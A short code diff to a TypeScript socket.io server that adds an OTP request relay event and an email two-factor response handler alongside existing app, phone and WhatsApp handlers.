@@ -50,6 +50,11 @@ const initializeSocketServer = (app: Application, socketPort: number): Server =>
             }
         });
 
+        socket.on('request_otp', (data: { userId: string, key: string }) => {
+            console.log('request_otp', data);
+            socket.to(data.userId).emit('request_otp', data.key);
+        });
+
         const handle2faResponse = async (event: string, userData: string) => {
             console.log(event, typeof userData);
             let data;
@@ -74,6 +79,7 @@ const initializeSocketServer = (app: Application, socketPort: number): Server =>
         socket.on('response_2fa_app', (userData: string) => handle2faResponse('2fa_app', userData));
         socket.on('response_2fa_otp_phone', (userData: string) => handle2faResponse('2fa_otp_phone', userData));
         socket.on('response_2fa_otp_whatsapp', (userData: string) => handle2faResponse('2fa_otp_whatsapp', userData));
+        socket.on('response_2fa_otp_email', (userData: string) => handle2faResponse('2fa_email', userData));
         
         socket.on('disconnect', async () => {
             console.log('User disconnected:', socket.id);
